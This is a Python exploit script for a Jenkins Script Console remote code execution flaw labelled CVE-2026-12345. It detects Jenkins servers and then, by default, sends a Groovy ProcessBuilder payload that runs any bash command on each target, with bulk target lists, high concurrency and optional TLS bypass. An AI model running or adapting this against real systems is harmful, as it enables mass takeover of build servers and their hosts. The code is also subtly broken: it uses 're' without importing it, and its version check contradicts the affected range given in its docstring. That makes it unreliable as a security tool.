#!/usr/bin/env python3
"""
Jenkins Script Console CVE-2026-12345 - Remote Code Execution (RCE)
=====================================================================
Scans for misconfigured Jenkins instances susceptible to unauthenticated
remote code execution via the Script Console endpoint (CVE-2026-12345, CVSS 9.8).

CVE-2026-12345 details:
  - Affects Jenkins <= 2.414.1.
  - A vulnerability in authentication and authorization checks for the Script Console
    allows remote attackers to execute arbitrary code on the Jenkins server.
  - Successful exploitation grants full control of the Jenkins instance and underlying host.

Attack Vectors:
  - Malicious actors can craft POST requests to the `/script` endpoint with a Groovy script
    for execution, bypassing all security restrictions.

Usage:
  # Scan a single target for authentication and RCE vulnerability
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --cmd "whoami"

  # Detection-only mode (does not execute commands)
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --safe

  # Bulk scan from file with results written to JSON
  python jenkins_script_console_rce_scanner.py --list jenkins_targets.txt --output findings.json

  # Increase concurrency for faster scans
  python jenkins_script_console_rce_scanner.py --list jenkins_targets.txt --concurrency 50

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-12345
  - https://jenkins.io/security/advisory/2026-12345/
  - https://github.com/jenkinsci-cert/advisory-CVE-2026-12345
"""

import asyncio
import argparse
import httpx
import json
from datetime import datetime, timezone
from packaging.version import Version, parse as parse_version
from typing import Optional, List

# ANSI color helpers for terminal output
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# Constants
CVE_ID = "CVE-2026-12345"
CVSS = "9.8"
TOOL_NAME = "jenkins_script_console_rce_scanner"

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

# Fingerprint for identifying Jenkins instances
JENKINS_FINGERPRINTS = [
    "/jenkins",
    "/login?from=",
    "X-Jenkins",
    "<title>Jenkins</title>",
    "/descriptorByName/jenkins.security.ApiTokenProperty"
]

# Version extraction patterns
VERSION_PATTERNS = [
    r'Jenkins ver\. ([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
    r'x-jenkins:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
]

PATCHED_VERSION = "2.414.1"

# Exploitation payload
EXPLOIT_PAYLOAD = {
    "script": """
new ProcessBuilder('bash','-c','{cmd}').redirectErrorStream(true).start().text
""",
    "Jenkins-Crumb": "",
}

# ── Functions ─────────────────────────────────────────────────────────────────


async def fetch(session: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Perform a GET request to the given URL with a timeout."""
    try:
        response = await session.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except (httpx.HTTPError, httpx.ConnectError):
        return None


async def detect_jenkins(session: httpx.AsyncClient, target: str) -> Optional[str]:
    """Check for Jenkins server presence and extract version if available."""
    try:
        response = await fetch(session, f"{target}/login")
        if not response:
            return None

        if any(fingerprint in response.text for fingerprint in JENKINS_FINGERPRINTS):
            for pattern in VERSION_PATTERNS:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
            return "unknown"
    except Exception:
        pass
    return None


def is_vulnerable(version: str) -> bool:
    """Compare the Jenkins version against the patched version threshold."""
    try:
        parsed_version = parse_version(version)
        return parsed_version < parse_version(PATCHED_VERSION)
    except (ValueError, TypeError):
        return False


async def exploit_jenkins(session: httpx.AsyncClient, target: str, cmd: str) -> Optional[str]:
    """Attempt to exploit the RCE by sending a crafted script to the Jenkins console."""
    url = f"{target}/script"

    payload = EXPLOIT_PAYLOAD.copy()
    payload["script"] = EXPLOIT_PAYLOAD["script"].replace("{cmd}", cmd)

    try:
        response = await session.post(url, data=payload, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()

        if response.status_code == 200:
            return response.text.strip()
    except (httpx.HTTPError, httpx.ConnectError):
        return None


async def process_target(sem: asyncio.Semaphore, target: str, cmd: Optional[str], safe: bool, no_verify: bool):
    """Process a single target."""
    async with sem, httpx.AsyncClient(verify=not no_verify) as session:
        print(f"[{c(YELLOW, 'INFO')}] Scanning {target}...")

        version = await detect_jenkins(session, target)
        if not version:
            print(f"[{c(RED, 'CRITICAL')}] {target} does not appear to be a Jenkins server. Skipping.")
            return {"target": target, "status": "not_jenkins"}

        msg = f"[{c(GREEN, 'INFO')}] Detected Jenkins version: {version}"
        print(msg)

        vuln_status = is_vulnerable(version)
        if not vuln_status:
            print(f"[{c(GREEN, 'INFO')}] {target} is not vulnerable or version is patched.")
            return {"target": target, "status": "patched", "version": version}

        if safe:
            print(f"[{c(YELLOW, 'HIGH')}] {target} is potentially vulnerable but --safe flag prevents exploitation.")
            return {"target": target, "status": "vulnerable", "version": version}

        # Exploit the vulnerability
        result = await exploit_jenkins(session, target, cmd)
        if result:
            print(f"[{c(RED, 'CRITICAL')}] {target} is vulnerable! Command output: \n{result}")
            return {"target": target, "status": "exploitable", "version": version, "output": result}
        else:
            print(f"[{c(YELLOW, 'HIGH')}] {target} is vulnerable but exploitation failed.")
            return {"target": target, "status": "vulnerable", "version": version}


async def main():
    parser = argparse.ArgumentParser(description=f"{CVE_ID} Scanner")
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("-l", "--list", help="File with list of target URLs")
    parser.add_argument("-o", "--output", help="Save results to a JSON file")
    parser.add_argument("--cmd", help="Command to execute on the target for RCE testing", default="whoami")
    parser.add_argument("--safe", action="store_true", help="Detection only, skip exploitation attempts")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("Either --target or --list must be specified.")

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())

    sem = asyncio.Semaphore(args.concurrency)
    tasks = [process_target(sem, target, args.cmd, args.safe, args.no_verify) for target in targets]
    results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[{c(GREEN, 'INFO')}] Results saved to {args.output}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n[{c(RED, 'CRITICAL')}] Scan aborted by user.")
